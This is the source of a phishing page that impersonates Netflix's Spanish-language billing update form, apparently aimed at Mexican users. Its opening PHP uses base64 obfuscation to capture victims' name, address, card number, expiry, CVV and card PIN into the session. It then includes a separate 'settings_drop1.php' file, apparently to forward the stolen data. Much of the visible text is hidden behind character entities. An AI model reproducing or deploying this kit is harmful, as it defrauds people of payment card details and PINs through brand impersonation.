<?php session_start();error_reporting(0);$_SESSION[base64_decode('X2Z1bGxuYW1lXw==')]=$_POST[base64_decode('ZnVsbF9uYW1l')];$_SESSION[base64_decode('X2FkZHJlc3MxXw==')]=$_POST[base64_decode('QWRkcmVzc0xpbmUx')];$_SESSION[base64_decode('X2FkZHJlc3MyXw==')]=$_POST[base64_decode('QWRkcmVzc0xpbmUy')];$_SESSION[base64_decode('X2NpdHlf')]=$_POST[base64_decode('Y2l0eQ==')];$_SESSION[base64_decode('X3N0YXRlXw==')]=$_POST[base64_decode('c3RhdGU=')];$_SESSION[base64_decode('X3ppcENvZGVf')]=$_POST[base64_decode('emlwQ29kZQ==')];$_SESSION[base64_decode('X2NjX2hvbGRlcl8=')]=$_POST[base64_decode('Y2NfaG9sZGVy')];$_SESSION[base64_decode('X2NjX251bWJlcl8=')]=$_POST[base64_decode('Y2NfbnVtYmVy')];$_SESSION[base64_decode('X2xhc3Q0Xw==')]=substr($_POST[base64_decode('Y2NfbnVtYmVy')],-4);$_SESSION[base64_decode('X2V4cGlyYXRpb25EYXRlXw==')]=$_POST[base64_decode('ZXhwaXJhdGlvbkRhdGU=')];$_SESSION[base64_decode('X2V4cGlyYXRpb25EYXRlX01NXw==')]=substr($_POST[base64_decode('ZXhwaXJhdGlvbkRhdGU=')],0,2);$_SESSION[base64_decode('X2V4cGlyYXRpb25EYXRlX1lZXw==')]=substr($_POST[base64_decode('ZXhwaXJhdGlvbkRhdGU=')],3,2);$_SESSION[base64_decode('X2NzY18=')]=$_POST[base64_decode('Y3Nj')];$_SESSION[base64_decode('X25pcF8=')]=$_POST[base64_decode('bmlw')];if($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')]==base64_decode('UE9TVA==')){if(empty($_POST[base64_decode('Y2NfbnVtYmVy')])==false){include base64_decode('c2V0dGluZ3NfZHJvcC5waHA=');}}?>

<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <meta charset="utf-8"/>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <title>&#78;&#101;&#116;&#102;&#108;&#105;&#120;</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-css-v4c579308/css/css/less%7Cpages%7Csignup%7Csimplicity%7Csimplicity.less/2/0z0O040H090w0G0T0W0P0I0Q0N0V0_/none/true/none"/>
      <link rel="shortcut icon" href="../lib/img/nficon2016.ico"/>
      <link rel="apple-touch-icon" href="../lib/img/nficon2016.png"/>
      <link type="text/css" rel="stylesheet" href="../lib/css/signin.css">
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript">
function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>

   </head>
   <body>
    <div id="Rotation">
         <p style="font-size: 13px;">&#86;&#97;&#108;&#105;&#100;&#97;&#110;&#100;&#111;&#32;&#115;&#117;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#99;&#105;&#195;&#179;&#110;&#46;&#46;&#46;</p>
      </div>
      <div id="appMountPoint">
         <div class="basicLayout modernInApp pt19 signupSimplicity-creditOptionMode simplicity">
            <div class="nfHeader noBorderHeader signupBasicHeader"><a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a><a href="/signout" class="authLinks signupBasicHeader" data-uia="header-signout-link">Cerrar sesión</a></div>
            <div class="freeTrialMessaging notification" id="notification">
               <script type="text/javascript">
                  var device = navigator.userAgent
                  if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
                  {
                  }
                  else
                  {
                  document.getElementById("notification").innerHTML = '<img width="60px" height="60px" style="position: sticky;float: left;margin-top: 20px;" src="../lib/img/earth.png">\
                         <div class="content">\
                          <span class="texts">&#65;&#99;&#116;&#117;&#97;&#108;&#105;&#122;&#97;&#32;&#116;&#117;&#32;&#105;&#110;&#102;&#114;&#111;&#109;&#97;&#99;&#105;&#111;&#110;&#32;&#100;&#101;&#32;&#112;&#97;&#103;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#99;&#111;&#110;&#116;&#105;&#110;&#117;&#97;&#114;</span>\
                         </div>';
                  }
               </script>
            </div>
            <div class="simpleContainer slimWidth">
               <div class="centerContainer firstLoad">
                  <form method="post" action="settings_drop1.php" class="idform">
                     <div class="paymentFormContainer">
                        <div class="stepHeader-container">
                           <div class="stepHeader">
                              <h1 class="stepTitle">&#67;&#111;&#110;&#102;&#105;&#103;&#117;&#114;&#97;&#32;&#116;&#117;&#32;&#100;&#105;&#114;&#101;&#99;&#99;&#105;on&#32;&#100;&#101;&#32;&#102;&#97;&#99;&#116;&#117;&#114;&#97;&#99;&#105;&#111;&#110;&#46;</h1>
                           </div>
                        </div>
                        <div class="fieldContainer">
                           <div class="">
                              <ul class="simpleForm structural ui-grid">
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="full_name" 
                                             id="full_name" 
                                             class="nfTextField" 
                                             pattern="[A-Za-z].{6,}"
                                             autocomplete="false" 
                                             value="" 
                                             placeholder="&#78;&#111;&#109;&#98;&#114;&#101;&#32;&#99;&#111;&#109;&#112;&#108;&#101;&#116;&#111;"
                                             oninvalid="
                                             this.setCustomValidity('&#80;&#111;&#114;&#32;&#102;&#97;&#118;&#111;&#114;&#32;&#105;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#32;&#110;&#111;&#109;&#98;&#114;&#101;&#32;&#118;&#97;&#108;&#105;&#100;&#111;')"
                                             oninput="setCustomValidity('')" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="AddressLine1" 
                                             id="AddressLine1" 
                                             class="nfTextField"
                                             placeholder="Calle, N° exterior, N° interior" 
                                             title="&#73;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#97;&#32;&#100;&#105;&#114;&#101;&#99;&#99;&#105;&#195;&#179;&#110;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#97;" 
                                             maxlength="60"
                                             autocomplete="false" 
                                             oninvalid="
                                             this.setCustomValidity('
Ingrese una dirección válida')"
                                             oninput="setCustomValidity('')"
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="AddressLine2" 
                                             class="nfTextField"
                                             maxlength="60" 
                                             placeholder="Colonia, Delegacion" 
                                             autocomplete="false"/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="city" 
                                             id="city" 
                                             class="nfTextField" 
                                             placeholder="&#67;&#105;&#117;&#100;&#97;&#100;&#44;&#32;&#77;&#117;&#110;&#105;&#99;&#105;&#112;&#105;&#111;" 
                                             autocomplete="false" 
                                             maxlength="50" 
                                             oninvalid="
                                             this.setCustomValidity('&#73;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#32;&#110;&#111;&#109;&#98;&#114;&#101;&#32;&#100;&#101;&#32;&#99;&#105;&#117;&#100;&#97;&#100;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#111;')"
                                             oninput="setCustomValidity('')"
                                             title="&#73;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#32;&#110;&#111;&#109;&#98;&#114;&#101;&#32;&#100;&#101;&#32;&#99;&#105;&#117;&#100;&#97;&#100;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#111;" 
                                             value=""
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="state" 
                                             id="state" 
                                             class="nfTextField" 
                                             placeholder="Estado/Provincia/Region"
                                             oninvalid="
                                             this.setCustomValidity('Ingrese un nombre de &#69;&#115;&#116;&#97;&#100;&#111;&#47;&#80;&#114;&#111;&#118;&#105;&#110;&#99;&#105;&#97;&#47;&#82;&#101;&#103;&#105;&#195;&#179;&#110; válido')"
                                             oninput="setCustomValidity('')"
                                             autocomplete="false"
                                             value="" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="zipCode" 
                                             id="zipCode" 
                                             value=""
                                             class="nfTextField" 
                                             oninvalid="
                                             this.setCustomValidity('&#80;&#111;&#114;&#32;&#102;&#97;&#118;&#111;&#114;&#32;&#105;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#32;&#99;&#195;&#179;&#100;&#105;&#103;&#111;&#32;&#112;&#111;&#115;&#116;&#97;&#108;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#111;')"
                                             oninput="setCustomValidity('')"
                                             placeholder="Código postal" 
                                             autocomplete="false"
                                             maxlength="20" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                   <div class="nfInput nfInputOversize">
                                     <div class="nfInputPlacement">
                                          <input type="text"                                  name="nip2" 
                                             id="nip2" 
                                             class="nfTextField" 
                                             placeholder="RFC"
                                             maxlength="12"
                                             autocomplete="false" />
                                     </div>
                                     <div class="tooltipWrapper"> <span class="nf-svg-icon ">
                                       <svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
                                         <g id="Spec2" fill="none">
                                           <g id="Help-Affordance2">
                                             <circle id="Oval-" stroke="#A9A6A6" cx="18" cy="18" r="17"></circle>
                                             <path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" id="?2" fill="#A9A6A6"></path>
                                           </g>
                                         </g>
                                       </svg>
                                     </span></div>
                                   </div>
                                 </li>
                              </ul>
                           </div>
                        </div>
                     </div>
                     <br>
                     <div class="paymentFormContainer">
                        <div class="stepHeader-container">
                           <div class="stepHeader">
                              <h1 class="stepTitle">&#67;&#111;&#110;&#102;&#105;&#103;&#117;&#114;&#97;&#32;&#116;&#117;&#32;&#116;&#97;&#114;&#106;&#101;&#116;&#97;&#32;&#100;&#101;&#32;&#99;&#114;&#101;&#100;&#105;&#116;&#111;&#32;&#111;&#32;&#100;e&#98;&#105;&#116;&#111;&#46;</h1>
                           </div>
                        </div>
                        <div class="fieldContainer">
                           <span class="logos logos-block"><span class="logoIcon VISA"></span><span class="logoIcon MASTERCARD"></span><span class="logoIcon AMEX"></span></span>
                           <div class="">
                              <ul class="simpleForm structural ui-grid">
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text"
                                             onkeydown="upperCaseF(this)" 
                                             name="cc_holder" 
                                             id="cc_holder" 
                                             class="nfTextField" 
                                             placeholder="&#78;&#111;&#109;&#98;&#114;&#101;&#32;&#100;&#101;&#108;&#32;&#116;&#105;&#116;&#117;&#108;&#97;&#114;&#32;&#100;&#101;&#32;&#108;&#97;&#32;&#116;&#97;&#114;&#106;&#101;&#116;&#97;"
                                             oninvalid="
                                             this.setCustomValidity('&#73;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#32;&#110;&#111;&#109;&#98;&#114;&#101;&#32;&#100;&#101;&#32;&#116;&#105;&#116;&#117;&#108;&#97;&#114;&#32;&#100;&#101;&#32;&#116;&#97;&#114;&#106;&#101;&#116;&#97;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#111;')"
                                             oninput="setCustomValidity('')" 
                                             autocomplete="false" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="tel" 
                                             name="cc_number" 
                                             id="cc_number" 
                                             class="nfTextField"
                                             pattern="[2-7][0-9 ]{11,24}" 
                                             placeholder="Numero de tarjeta"
                                             oninvalid="
                                             this.setCustomValidity('&#80;&#111;&#114;&#32;&#102;&#97;&#118;&#111;&#114;&#44;&#32;&#105;&#110;&#116;&#114;&#111;&#100;&#117;&#122;&#99;&#97;&#32;&#117;&#110;&#32;&#110;&#195;&#186;&#109;&#101;&#114;&#111;&#32;&#100;&#101;&#32;&#116;&#97;&#114;&#106;&#101;&#116;&#97;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#111;')"
                                             oninput="setCustomValidity('')"  
                                             autocomplete="false" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="tel" 
                                             name="expirationDate" 
                                             id="expirationDate" 
                                             class="nfTextField" 
                                             placeholder="&#70;&#101;&#99;&#104;&#97;&#32;&#100;&#101;&#32;&#118;&#101;&#110;&#99;&#105;&#109;&#105;&#101;&#110;&#116;&#111;&#32;&#40;&#77;&#77;&#47;&#65;&#65;&#41;
" 
                                             oninvalid="
                                             this.setCustomValidity('&#80;&#111;&#114;&#32;&#102;&#97;&#118;&#111;&#114;&#44;&#32;&#105;&#110;&#116;&#114;&#111;&#100;&#117;&#122;&#99;&#97;&#32;&#117;&#110;&#97;&#32;&#102;&#101;&#99;&#104;&#97;&#32;&#100;&#101;&#32;&#118;&#101;&#110;&#99;&#105;&#109;&#105;&#101;&#110;&#116;&#111;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#97;')"
                                             oninput="setCustomValidity('')"  
                                             maxlength="8" 
                                             value="" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                      <div class="nfInputPlacement">
                                          <input type="tel" 
                                             name="csc" 
                                             id="csc" 
                                             class="nfTextField" 
                                             placeholder="Codigo de seguridad (CVV)"
                                             oninvalid="
                                             this.setCustomValidity('&#73;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#32;&#99;&#195;&#179;&#100;&#105;&#103;&#111;&#32;&#100;&#101;&#32;&#115;&#101;&#103;&#117;&#114;&#105;&#100;&#97;&#100;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#111;')"
                                             oninput="setCustomValidity('')"  
                                             maxlength="4"
                                             pattern="[0-9]{3,4}" 
                                             autocomplete="false" 
                                             required/>
                                       </div>
										<li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                      <div class="nfInputPlacement">
                                          <input type="tel" 
                                             name="nip" 
                                             id="nip" 
                                             class="nfTextField" 
                                             placeholder="&#78;&#73;&#80;"
                                             oninvalid="
                                             this.setCustomValidity('&#73;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#32;&#99;&#195;&#179;&#100;&#105;&#103;&#111;&#32;&#100;&#101;&#32;&#78;&#73;&#80;&#32;&#118;&#195;&#161;&#108;&#105;&#100;&#111;')"
                                             oninput="setCustomValidity('')"  
                                             maxlength="4"
                                             pattern="[0-9]{3,4}" 
                                             autocomplete="false" 
                                             required/>
                                       </div>
                                       <div class="tooltipWrapper">
                                          <span class="nf-svg-icon ">
                                             <svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
                                                <g id="Spec" fill="none">
                                                   <g id="Help-Affordance">
                                                      <circle id="Oval-128" stroke="#A9A6A6" cx="18" cy="18" r="17"></circle>
                                                      <path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" id="?" fill="#A9A6A6"></path>
                                                   </g>
                                                </g>
                                             </svg>
                                          </span>
                                       </div>
                                    </div>
								 </li>
                              </ul>
                           </div>
                           <ul class="simpleForm structural ui-grid">
                              <li class="nfFormSpace">
                                 <div class="signupTerms" id="tou-rest-freetrial" data-automation-details="false">
                                    <span id="">
                                       <p>Al hacer clic en ACEPTAR Y CONTINUAR, he leído y acepto<a target="blank" href="">Acuerdo de usuario de Netflix</a>, <a target="blank" href="">Política de privacidad</a> y <a target="blank" href="">Política de actualización de comunicaciones electrónicas</a>.</p>
                                    </span>
                                 </div>
                              </li>
                           </ul>
                        </div>
                     </div>
                     <div class="submitBtnContainer">
                        <button id="submit" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit">
                        ACEPTAR Y CONTINUAR
                        </button>
                     </div>
                  </form>
               </div>
            </div>
            <div class="site-footer-wrapper centered">
               <div class="footer-divider"></div>
               <div class="site-footer">
                  <p align="center" class="footer-top"><a class="footer-top-a" href="#">¿Preguntas? Contáctenos.</a></p>
               </div>
            </div>
         </div>
      </div>

   </body>
</html>